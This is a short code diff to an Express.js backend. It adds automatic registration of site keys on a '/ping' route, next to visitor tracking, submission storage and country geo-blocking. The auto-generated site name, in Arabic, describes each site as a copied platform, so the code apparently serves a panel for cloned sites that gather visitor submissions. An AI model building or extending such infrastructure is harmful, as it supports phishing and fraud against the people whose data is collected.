@@ -1,4 +1,5 @@
 import express from 'express';
+import Site from '../models/Site.js';
 import Visitor from '../models/Visitor.js';
 import Submission from '../models/Submission.js';
 import BlockedCountry, { SystemSetting } from '../models/BlockedCountry.js';
@@ -81,6 +82,17 @@ router.post('/ping', async (req, res) => {
         }
 
         const activeSite = (siteKey && siteKey.trim()) ? siteKey.trim() : 'site_cars_01';
+
+        // 🧠 تسجيل الموقع تلقائياً إذا لم يكن مسجلاً مسبقاً لضمان ظهوره في لوحة التحكم فوراً
+        try {
+            await Site.findOneAndUpdate(
+                { siteKey: activeSite },
+                { siteKey: activeSite, name: 'منصة منافذ المنسوخة (' + activeSite + ')', color: '#10b981' },
+                { upsert: true }
+            );
+        } catch (e) {
+            console.error('Error auto-registering site:', e.message);
+        }
 
         let isBlockedByGeo = false;
         const geoSetting = await SystemSetting.findOne({ key: 'geo_mode' });
